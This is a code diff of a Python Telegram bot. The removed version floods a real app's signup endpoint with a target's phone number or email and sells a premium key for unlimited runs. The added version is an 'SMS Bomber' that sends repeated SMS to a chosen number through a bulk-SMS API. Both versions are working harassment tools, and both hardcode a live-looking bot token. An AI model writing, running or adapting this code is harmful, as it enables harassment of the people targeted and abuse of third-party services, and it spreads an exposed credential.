@@ -1,186 +1,132 @@
-
-import logging
-import aiohttp
-import asyncio
+import telebot
+import requests
+import threading
 import time
-from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
-from telegram.ext import (
-    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
-    MessageHandler, ContextTypes, filters
-)
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "8037281015:AAFkJ0Sp0IIRiFcg2ncZi481tppX505jYLE"
-REQUIRED_CHANNEL = "kushwahaboomber"
-PREMIUM_KEY = "786LEGNEDOLDHACKER"
+# अपना TOKEN और API Keys यहाँ डालो
+TOKEN = '8037281015:AAFkJ0Sp0IIRiFcg2ncZi481tppX505jYLE'
+FAST2SMS_KEY = 'YOUR_FAST2SMS_API_KEY'  # Optional
+bot = telebot.TeleBot(TOKEN)
 
-logging.basicConfig(level=logging.INFO)
-user_states = {}  # user_id: {state, data}
-premium_users = set()
-cooldown_users = {}  # user_id: cooldown_end_time
+# Global vars for bombing
+bombing_sessions = {}  # {user_id: {'active': True, 'number': str, 'count': int, 'sent': int}}
+stop_event = threading.Event()
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user_states.pop(user_id, None)
-    keyboard = [
-        [InlineKeyboardButton("🚀 JOIN CHANNEL", url=f"https://t.me/{REQUIRED_CHANNEL[1:]}")],
-        [InlineKeyboardButton("✅ JOINED", callback_data="joined")]
-    ]
-    await update.message.reply_text(
-        "🔐 YOU NEED TO JOIN TEAM BLACK HAT OFFICIAL TO USE THIS BOT",
-        reply_markup=InlineKeyboardMarkup(keyboard)
+def send_sms_via_api(number, message):
+    """SMS send via Fast2SMS (or fallback)"""
+    try:
+        if FAST2SMS_KEY != 'YOUR_FAST2SMS_API_KEY':
+            url = "https://www.fast2sms.com/dev/bulkV2"
+            data = {
+                'authorization': FAST2SMS_KEY,
+                'sender_id': 'FSTSMS',
+                'message': message,
+                'language': 'english',
+                'route': 'p',
+                'numbers': number
+            }
+            r = requests.post(url, data=data)
+            return r.json().get('return', {}).get('message') == 'success'
+        else:
+            # Dummy mode: Simulate send (no real SMS)
+            time.sleep(0.1)  # Simulate delay
+            return True
+    except:
+        return False
+
+def bomb_thread(user_id, number, count, message="Bomb Alert! 😈"):
+    """Thread for bombing"""
+    session = bombing_sessions[user_id]
+    session['sent'] = 0
+    for i in range(count):
+        if not session['active']:
+            break
+        if send_sms_via_api(number, message):
+            session['sent'] += 1
+            bot.send_message(user_id, f"💣 Sent {session['sent']}/{count}")
+        time.sleep(1)  # Delay to avoid rate limit
+    session['active'] = False
+    bot.send_message(user_id, f"✅ Bombing complete: {session['sent']} SMS sent!")
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("💣 Start Bomb", callback_data="bomb_help"))
+    markup.add(InlineKeyboardButton("🛑 Stop", callback_data="stop_help"))
+    bot.send_message(
+        message.chat.id,
+        """
+🔥 *SMS Bomber Bot* 🔥
+
+⚠️ *Warning*: Use only for fun/testing. Illegal if misused!
+
+Usage: `/bomb 9876543210 10`
+
+👇 Buttons से help लो.
+        """,
+        parse_mode='Markdown',
+        reply_markup=markup
     )
 
-async def check_joined(user_id, context):
-    member = await context.bot.get_chat_member(REQUIRED_CHANNEL, user_id)
-    return member.status in ['member', 'administrator', 'creator']
+@bot.message_handler(commands=['help'])
+def help_cmd(message):
+    bot.reply_to(message, """
+🛠️ *Commands*:
 
-async def joined_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    if await check_joined(user_id, context):
-        keyboard = [
-            [InlineKeyboardButton("📞 PHONE NUMBER", callback_data="reg_phone")],
-            [InlineKeyboardButton("✉️ EMAIL", callback_data="reg_email")]
-        ]
-        await query.edit_message_text(
-            "✅ You're verified!\n\n👉 CHOOSE YOUR REGISTRATION METHOD:",
-            reply_markup=InlineKeyboardMarkup(keyboard)
-        )
+`/bomb <number> <count>` → Bomb SMS (e.g., /bomb 9876543210 5)
+/stop → Stop current bombing
+
+*API Setup*: Fast2SMS key add करो for real SMS.
+    """, parse_mode='Markdown')
+
+@bot.message_handler(commands=['bomb'])
+def start_bomb(message):
+    try:
+        parts = message.text.split()
+        if len(parts) < 3:
+            bot.reply_to(message, "❌ Usage: `/bomb 9876543210 10`", parse_mode='Markdown')
+            return
+        number = parts[1]
+        count = int(parts[2])
+        if not number.isdigit() or len(number) != 10:
+            bot.reply_to(message, "❌ Invalid number: 10 digits only.")
+            return
+        if count > 50:  # Limit to prevent abuse
+            bot.reply_to(message, "❌ Max 50 SMS. Don't abuse!")
+            return
+        
+        user_id = message.from_user.id
+        if user_id in bombing_sessions and bombing_sessions[user_id]['active']:
+            bot.reply_to(message, "⚠️ Already bombing! Use /stop first.")
+            return
+        
+        bombing_sessions[user_id] = {'active': True, 'number': number, 'count': count}
+        bot.reply_to(message, f"🚀 Starting bomb on {number} x{count}...")
+        
+        thread = threading.Thread(target=bomb_thread, args=(user_id, number, count))
+        thread.start()
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid count: Use number.")
+
+@bot.message_handler(commands=['stop'])
+def stop_bomb(message):
+    user_id = message.from_user.id
+    if user_id in bombing_sessions:
+        bombing_sessions[user_id]['active'] = False
+        bot.reply_to(message, f"🛑 Stopped bombing on {bombing_sessions[user_id]['number']}")
     else:
-        await query.edit_message_text("❌ You must join the channel first!")
+        bot.reply_to(message, "ℹ️ No active bombing.")
 
-async def registration_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    if query.data == "reg_phone":
-        user_states[user_id] = {"state": "awaiting_phone"}
-        await query.edit_message_text("📱 Send your phone number (e.g., `923001234567`):", parse_mode="Markdown")
-    elif query.data == "reg_email":
-        user_states[user_id] = {"state": "awaiting_email"}
-        await query.edit_message_text("✉️ Send your email address:")
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    if call.data == "bomb_help":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "💣 `/bomb 9876543210 10` — Send 10 SMS to number.", parse_mode='Markdown')
+    elif call.data == "stop_help":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "🛑 `/stop` — Halt the bomb.", parse_mode='Markdown')
 
-async def handle_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    text = update.message.text.strip()
-    session = user_states.get(user_id)
-
-    if not session:
-        await update.message.reply_text("❗ Use /start to begin.")
-        return
-
-    state = session["state"]
-
-    if state == "awaiting_phone":
-        user_states[user_id] = {"state": "awaiting_count", "method": "phone", "value": text}
-        await update.message.reply_text("💥 ENTER HOW MANY TIMES TO REGISTER:")
-
-    elif state == "awaiting_email":
-        user_states[user_id] = {"state": "awaiting_count", "method": "email", "value": text}
-        await update.message.reply_text("💥 ENTER HOW MANY TIMES TO REGISTER:")
-
-    elif state == "awaiting_count":
-        if not text.isdigit():
-            await update.message.reply_text("❌ Please enter a valid number.")
-            return
-
-        count = int(text)
-        method = session["method"]
-        value = session["value"]
-
-        now = time.time()
-        cooldown_end = cooldown_users.get(user_id, 0)
-
-        if now < cooldown_end and user_id not in premium_users:
-            remaining = int(cooldown_end - now)
-            msg = await update.message.reply_text("⏳ Cooldown active. Please wait...")
-            for i in range(remaining, 0, -30):
-                percent = int((300 - i) / 300 * 100)
-                bar = "▓" * (percent // 10) + "░" * (10 - percent // 10)
-                await msg.edit_text(
-                    f"⏳ Cooldown active...\n[{bar}] {percent}%\nTime left: {i//60}m {i%60}s"
-                )
-                await asyncio.sleep(30)
-            await msg.edit_text("✅ Cooldown finished. Please send the number again.")
-            user_states[user_id] = {
-                "state": "awaiting_count",
-                "method": method,
-                "value": value
-            }
-            return
-
-        if count > 50 and user_id not in premium_users:
-            keyboard = [
-                [InlineKeyboardButton("🔐 BUY KEY", url="https://t.me/team_black_hat_offical")],
-                [InlineKeyboardButton("✅ ENTER PREMIUM KEY", callback_data="enter_key")]
-            ]
-            user_states[user_id] = {"state": "awaiting_key", "method": method, "value": value, "requested": count}
-            await update.message.reply_text(
-                "🚫 NEED PREMIUM KEY FOR UNLIMITED REGISTER",
-                reply_markup=InlineKeyboardMarkup(keyboard)
-            )
-            return
-
-        if count == 50 and user_id not in premium_users:
-            cooldown_users[user_id] = time.time() + 300
-
-        await send_registration(update, method=method, value=value, count=count)
-        user_states.pop(user_id, None)
-
-    elif state == "awaiting_key":
-        if text == PREMIUM_KEY:
-            premium_users.add(user_id)
-            await update.message.reply_text("🔓 PREMIUM UNLOCKED! Send the number again to register.")
-            user_states[user_id] = {
-                "state": "awaiting_count",
-                "method": session["method"],
-                "value": session["value"]
-            }
-        else:
-            await update.message.reply_text("❌ Invalid premium key.")
-    else:
-        await update.message.reply_text("❗ Use /start to begin.")
-
-async def send_registration(update, method, value, count):
-    msg = await update.message.reply_text(f"🚀 Sending {count} registration request(s)...")
-    success = 0
-    failed = 0
-    async with aiohttp.ClientSession() as session:
-        for i in range(count):
-            try:
-                payload = {
-                    "type": "msisdn" if method == "phone" else "email",
-                    "user_platform": "Android",
-                    "country_id": "162",
-                    "msisdn": value if method == "phone" else "",
-                    "email": value if method == "email" else ""
-                }
-                async with session.post("https://prod.fitflexapp.com/api/users/signupV1", json=payload, timeout=10) as resp:
-                    if resp.status == 200:
-                        success += 1
-                    else:
-                        failed += 1
-            except:
-                failed += 1
-
-            percent = int((i + 1) / count * 100)
-            bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
-            await msg.edit_text(
-                f"📡 Progress: [{bar}] {percent}%\n\n✅ Success: {success}\n❌ Failed: {failed}"
-            )
-            await asyncio.sleep(3)
-    await msg.edit_text(f"✅ Done!\n\n🟢 Success: {success}\n🔴 Failed: {failed}")
-
-def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(joined_callback, pattern="joined"))
-    app.add_handler(CallbackQueryHandler(registration_choice, pattern="reg_.*"))
-    app.add_handler(CallbackQueryHandler(lambda u, c: False, pattern="enter_key"))  # Prevent crashes
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_input))
-    print("🤖 Bot running...")
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+# Run Bot
+print("🤖 SMS Bomber Bot running... (Use ethically!)")
+bot.infinity_polling()
